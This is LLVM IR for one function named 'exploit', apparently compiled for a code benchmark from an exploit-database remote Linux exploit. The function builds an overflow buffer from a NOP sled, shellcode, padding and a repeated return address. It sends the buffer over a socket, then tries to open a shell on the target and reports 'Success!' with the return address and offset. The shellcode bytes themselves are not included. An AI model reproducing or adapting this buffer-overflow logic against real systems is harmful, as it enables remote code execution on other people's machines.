; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_398.c_exploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_398.c_exploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i64, i32, i32, i32 }

@MAXPATHLEN = common dso_local global i32 0, align 4
@chode = common dso_local global i32 0, align 4
@rsx = common dso_local global %struct.TYPE_2__ zeroinitializer, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [2 x i8] c";\00", align 1
@.str.1 = private unnamed_addr constant [2 x i8] c"P\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"p\00", align 1
@.str.3 = private unnamed_addr constant [34 x i8] c"\0A\0ASuccess! (ret: %p offset: %d)\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @exploit(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i64, align 8
  %6 = alloca [4 x i8], align 1
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %9 = load i32, i32* @MAXPATHLEN, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %4, align 8
  %12 = alloca i8, i64 %10, align 16
  store i64 %10, i64* %5, align 8
  %13 = load i32, i32* @MAXPATHLEN, align 4
  %14 = sdiv i32 %13, 2
  %15 = load i32, i32* @chode, align 4
  %16 = call i32 @strlen(i32 %15)
  %17 = sub nsw i32 %14, %16
  %18 = call i32 @memset(i8* %12, i8 signext -112, i32 %17)
  %19 = load i32, i32* @MAXPATHLEN, align 4
  %20 = sdiv i32 %19, 2
  %21 = load i32, i32* @chode, align 4
  %22 = call i32 @strlen(i32 %21)
  %23 = sub nsw i32 %20, %22
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %12, i64 %24
  %26 = load i32, i32* @chode, align 4
  %27 = load i32, i32* @chode, align 4
  %28 = call i32 @strlen(i32 %27)
  %29 = call i32 @memcpy(i8* %25, i32 %26, i32 %28)
  %30 = load i32, i32* @MAXPATHLEN, align 4
  %31 = sdiv i32 %30, 2
  store i32 %31, i32* %7, align 4
  br label %32

32:                                               ; preds = %43, %1
  %33 = load i32, i32* %7, align 4
  %34 = load i32, i32* @MAXPATHLEN, align 4
  %35 = sdiv i32 %34, 2
  %36 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 0), align 8
  %37 = add nsw i32 %35, %36
  %38 = icmp slt i32 %33, %37
  br i1 %38, label %39, label %46

39:                                               ; preds = %32
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %12, i64 %41
  store i8 120, i8* %42, align 1
  br label %43

43:                                               ; preds = %39
  %44 = load i32, i32* %7, align 4
  %45 = add nsw i32 %44, 1
  store i32 %45, i32* %7, align 4
  br label %32

46:                                               ; preds = %32
  %47 = load i32, i32* @MAXPATHLEN, align 4
  %48 = sdiv i32 %47, 2
  %49 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 0), align 8
  %50 = add nsw i32 %48, %49
  store i32 %50, i32* %7, align 4
  br label %51

51:                                               ; preds = %61, %46
  %52 = load i32, i32* %7, align 4
  %53 = load i32, i32* @MAXPATHLEN, align 4
  %54 = icmp slt i32 %52, %53
  br i1 %54, label %55, label %64

55:                                               ; preds = %51
  %56 = load i64, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 1), align 8
  %57 = load i32, i32* %7, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds i8, i8* %12, i64 %58
  %60 = bitcast i8* %59 to i64*
  store i64 %56, i64* %60, align 1
  br label %61

61:                                               ; preds = %55
  %62 = load i32, i32* %7, align 4
  %63 = add nsw i32 %62, 4
  store i32 %63, i32* %7, align 4
  br label %51

64:                                               ; preds = %51
  %65 = load i32, i32* @MAXPATHLEN, align 4
  %66 = sub nsw i32 %65, 1
  %67 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %68 = bitcast i8* %67 to i32*
  store i32 %66, i32* %68, align 1
  %69 = load i32, i32* %3, align 4
  %70 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %71 = call i64 @write(i32 %69, i8* %70, i32 4)
  %72 = icmp slt i64 %71, 0
  br i1 %72, label %73, label %74

73:                                               ; preds = %64
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %123

74:                                               ; preds = %64
  %75 = load i32, i32* %3, align 4
  %76 = load i32, i32* @MAXPATHLEN, align 4
  %77 = sub nsw i32 %76, 1
  %78 = call i64 @write(i32 %75, i8* %12, i32 %77)
  %79 = icmp slt i64 %78, 0
  br i1 %79, label %80, label %81

80:                                               ; preds = %74
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %123

81:                                               ; preds = %74
  %82 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  %83 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %84 = bitcast i8* %83 to i32*
  store i32 %82, i32* %84, align 1
  %85 = load i32, i32* %3, align 4
  %86 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %87 = call i64 @write(i32 %85, i8* %86, i32 4)
  %88 = icmp slt i64 %87, 0
  br i1 %88, label %89, label %90

89:                                               ; preds = %81
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %123

90:                                               ; preds = %81
  %91 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %92 = call i32 @memset(i8* %91, i8 signext 0, i32 4)
  %93 = load i32, i32* %3, align 4
  %94 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %95 = call i64 @write(i32 %93, i8* %94, i32 4)
  %96 = icmp slt i64 %95, 0
  br i1 %96, label %97, label %98

97:                                               ; preds = %90
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %123

98:                                               ; preds = %90
  %99 = call i32 @usleep(i32 50000)
  %100 = load i32, i32* @stderr, align 4
  %101 = call i32 (i32, i8*, ...) @fprintf(i32 %100, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str, i64 0, i64 0))
  %102 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 3), align 4
  %103 = call i32 @open_s(i32 %102, i32 30464)
  store i32 %103, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 4), align 8
  %104 = icmp slt i32 %103, 0
  br i1 %104, label %105, label %118

105:                                              ; preds = %98
  %106 = call i32 (...) @rand()
  %107 = srem i32 %106, 2
  %108 = icmp ne i32 %107, 0
  br i1 %108, label %109, label %112

109:                                              ; preds = %105
  %110 = load i32, i32* @stderr, align 4
  %111 = call i32 (i32, i8*, ...) @fprintf(i32 %110, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.1, i64 0, i64 0))
  br label %115

112:                                              ; preds = %105
  %113 = load i32, i32* @stderr, align 4
  %114 = call i32 (i32, i8*, ...) @fprintf(i32 %113, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  br label %115

115:                                              ; preds = %112, %109
  %116 = load i32, i32* %3, align 4
  %117 = call i32 @quit(i32 %116)
  store i32 -1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %123

118:                                              ; preds = %98
  %119 = load i32, i32* @stderr, align 4
  %120 = load i64, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 1), align 8
  %121 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @rsx, i32 0, i32 2), align 8
  %122 = call i32 (i32, i8*, ...) @fprintf(i32 %119, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.3, i64 0, i64 0), i64 %120, i32 %121)
  store i32 1, i32* %2, align 4
  store i32 1, i32* %8, align 4
  br label %123

123:                                              ; preds = %118, %115, %97, %89, %80, %73
  %124 = load i8*, i8** %4, align 8
  call void @llvm.stackrestore(i8* %124)
  %125 = load i32, i32* %2, align 4
  ret i32 %125
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(i8*, i8 signext, i32) #2

declare dso_local i32 @strlen(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #2

declare dso_local i64 @write(i32, i8*, i32) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

declare dso_local i32 @open_s(i32, i32) #2

declare dso_local i32 @rand(...) #2

declare dso_local i32 @quit(i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
